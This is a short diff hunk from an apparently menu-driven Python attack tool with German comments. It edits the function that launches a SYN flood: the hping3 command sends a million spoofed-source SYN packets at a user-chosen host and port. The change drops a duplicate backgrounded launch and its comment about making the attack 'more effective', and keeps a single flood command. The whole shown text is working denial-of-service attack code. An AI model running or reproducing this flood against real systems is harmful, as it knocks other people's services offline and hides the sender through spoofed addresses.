@@ -68,7 +68,5 @@ def SYNFLOOD_Menu():
 
 ##funktion die für das flooding verantwortlich ist
 def flooding(atHost, atPort):
-	# starte hping3 zweimal um den Angriff effektiver zu machen
-	execute("hping3 -c 1000000 -d 120 -S -w 64 -p " + str(atPort) + " --flood --rand-source " + str(atHost) + " &")
-	execute("hping3 -c 1000000 -d 120 -S -w 64 -p " + str(atPort) + " --flood --rand-source " + str(atHost) + " &")
+	execute("hping3 -c 1000000 -d 120 -S -w 64 -p " + str(atPort) + " --flood --rand-source " + str(atHost))
 
